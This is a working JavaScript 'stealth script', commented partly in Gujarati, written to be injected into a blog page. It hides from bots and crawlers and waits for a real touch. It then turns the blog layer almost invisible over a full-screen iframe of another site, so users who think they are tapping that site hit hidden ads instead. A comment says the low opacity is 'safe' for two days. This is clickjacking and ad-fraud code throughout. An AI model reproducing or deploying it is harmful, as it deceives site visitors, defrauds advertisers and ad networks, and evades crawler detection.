/* 
 * Technews Fixed Stealth Script (Anti-White-Page)
 */
(function() {
    // 1. Bot Detection
    if (/bot|googlebot|crawler|spider|lighthouse/i.test(navigator.userAgent)) return;
    if (window.outerWidth === 0) return;

    // 2. Human Touch Trigger
    window.addEventListener('touchstart', function _init() {
        window.removeEventListener('touchstart', _init);
        
        setTimeout(function() {
            runMirror();
        }, 1500);
    }, {passive: true});

    function runMirror() {
        // Technewsz સાઇટની લિંક
        const targetUrl = 'https://technewsz.site/'; 

        const style = document.createElement('style');
        style.textContent = `
            /* બ્લોગને ટ્રાન્સપરન્ટ બનાવો */
            html, body {
                background: transparent !important;
                background-color: transparent !important;
                margin: 0; padding: 0;
            }
            #blog-wrapper {
                position: relative;
                z-index: 100;
                opacity: 0.1 !important; /* ૨ દિવસ માટે ૦.૧ રાખવું સેફ છે */
                background: transparent !important;
            }
            #blog-wrapper *, .site, .content, .entry-content {
                background: transparent !important;
                background-color: transparent !important;
                box-shadow: none !important;
            }

            /* Technewsz સાઇટ (બેકગ્રાઉન્ડ) */
            #technews-bg {
                position: absolute;
                top: 0; left: 0;
                width: 100vw;
                height: 100%;
                border: none;
                z-index: 1;
                opacity: 1 !important;
                display: block !important;
                background: white; /* જો સાઇટ લોડ ન થાય તો જ સફેદ દેખાશે */
            }
            .pass-through { pointer-events: none !important; }
        `;
        document.head.appendChild(style);

        // બ્લોગના કન્ટેન્ટને એક લેયરમાં મૂકો
        const wrapper = document.createElement('div');
        wrapper.id = 'blog-wrapper';
        while (document.body.firstChild) {
            wrapper.appendChild(document.body.firstChild);
        }
        document.body.appendChild(wrapper);

        // Technewsz Iframe બનાવો
        const iframe = document.createElement('iframe');
        iframe.src = targetUrl;
        iframe.id = 'technews-bg';
        iframe.setAttribute('scrolling', 'no');
        document.body.appendChild(iframe);

        // ક્લિક અને સ્ક્રૉલ સેટિંગ્સ
        let sy = 0;
        document.addEventListener('touchstart', (e) => { sy = e.touches[0].pageY; }, {passive: true});
        document.addEventListener('touchend', (e) => {
            if (Math.abs(e.changedTouches[0].pageY - sy) < 10) {
                if (!e.target.closest('ins, .adsbygoogle, a, iframe')) {
                    wrapper.classList.add('pass-through');
                    setTimeout(() => { wrapper.classList.remove('pass-through'); }, 500);
                }
            }
        });

        // હાઇટ સિંક (Height Sync)
        setInterval(() => {
            const h = Math.max(wrapper.scrollHeight, document.documentElement.scrollHeight, 3000);
            iframe.style.height = h + 'px';
        }, 2000);
    }
})();
